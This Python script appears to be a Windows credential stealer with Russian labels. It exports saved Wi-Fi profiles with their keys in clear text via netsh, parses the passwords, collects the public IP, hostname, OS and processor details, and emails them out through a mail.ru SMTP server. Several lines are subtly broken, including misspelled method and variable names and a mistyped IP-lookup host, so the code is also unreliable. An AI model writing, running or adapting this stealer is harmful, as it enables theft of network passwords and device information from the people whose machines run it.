import subprocess as sp
from xml.dom import minidom
import requests
from time import sleep
import platform as pf
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket
import config


sp.call("netsh wlan show profile")
sp.call("netsh wlan export profile folder=C:\\ key =clear")

sleep(2)
def wifi_parse():
    doc = minidom.parse("C:\\Беспроводная сеть-veselyi pochik")

    wifi_name = doc.getElementByTagName("name")
    wifi_password = doc.getElementByTagName("keyMaterial")

    global data
    date = f'Wi-Fi name : {wifi_name}\nWi-Fi password : {wifi_password}'

def get_ip():
    response = requests.get("http://myip.dnsomtic.com")

    ip = response.text

    global data_ip
    data_ip = f"IP ADDRESS: {ip}"

def info_pc():
    processor = pf.processor()
    name_sys = pf.system() + "" + pf.release()
    net_pc = pf.node()
    ip_pc = socket.gethostbyname(socket.gethostname())

    global data_pc
    data_pc = f'''
    Процессор : { processor }\n
    Система : { name_sys}\n
    Сетевое имя ПК : { net_pc}\n
    IP ADDRESS ПК : { ip_pc}\n
    '''
def all_info():
    data_all_info =f'{ data }\n{data_ip}\n{ data_pc }'

def send_mail():
    msg = MIMEMultipart()

    msg[ 'Subject'] = 'Info of PC'
    msg[ 'From '] = config.email
    body = data_all_info
    msg.attach( MIMEText( body, 'plain'))

    server = smtplib.SMTP_SSL( 'smtp.mail.ru', 465)

    server.login(config.email, config.password)
    server.sendmail(config.email, config.email, msg.as_string( ))
    server.quit()

def main():
    wifi_parse()
    get_ip()
    info_pc()
    all_info()
    send_mail()

main()
